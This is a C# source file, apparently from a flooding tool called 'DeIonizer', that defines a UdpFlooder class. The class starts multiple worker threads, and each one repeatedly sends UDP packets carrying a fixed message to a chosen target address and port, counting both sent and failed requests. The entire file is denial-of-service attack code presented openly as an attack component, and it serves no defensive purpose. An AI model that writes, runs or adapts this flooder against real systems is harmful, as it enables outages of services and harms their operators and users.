using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace DeIonizer.Core.Flooders
{
    public class UdpFlooder : BaseFlooder
    {
        public override string DisplayName => "UDP";

        private List<Thread> WorkerThreads { get; } = new List<Thread>();

        public override event EventHandler FloodError;

        private void Initialize()
        {
            //Reset
            WorkerThreads.ForEach(t => t.Abort());
            WorkerThreads.Clear();
        }

        private void SpamLoop()
        {
            //Infinitely spam
            try
            {
                var remoteHost = new IPEndPoint(Target, Port);
                while (IsFlooding)
                {
                    using (var socket = new Socket(remoteHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp))
                    {
                        socket.Blocking = false;
                        State = AttackStatus.Requesting; // SET STATE TO REQUESTING //

                        //Keep flooding!
                        try
                        {
                            while (IsFlooding)
                            {
                                var buf = System.Text.Encoding.ASCII.GetBytes(Message);
                                socket.SendTo(buf, SocketFlags.None, remoteHost);
                                Requested++;
                                //Give the CPU a break
                                if (Delay >= 0) Thread.Sleep(Delay + 1);
                            }
                        }
                        catch { Failed++; }
                    }
                }
            }
            catch
            {
                //Oh no, a thread died
                IsFlooding = false;
                FloodError?.Invoke(this, EventArgs.Empty);
            }
        }

        public override void Start()
        {
            for (int i = 0; i < Threads; i++)
            {
                WorkerThreads.Add(new Thread(SpamLoop));
            }
            foreach (var worker in WorkerThreads)
            {
                worker.Start();
            }
            IsFlooding = true;
        }

        public override void Stop()
        {
            Initialize(); //Nuke everything
            IsFlooding = false;
        }
    }
}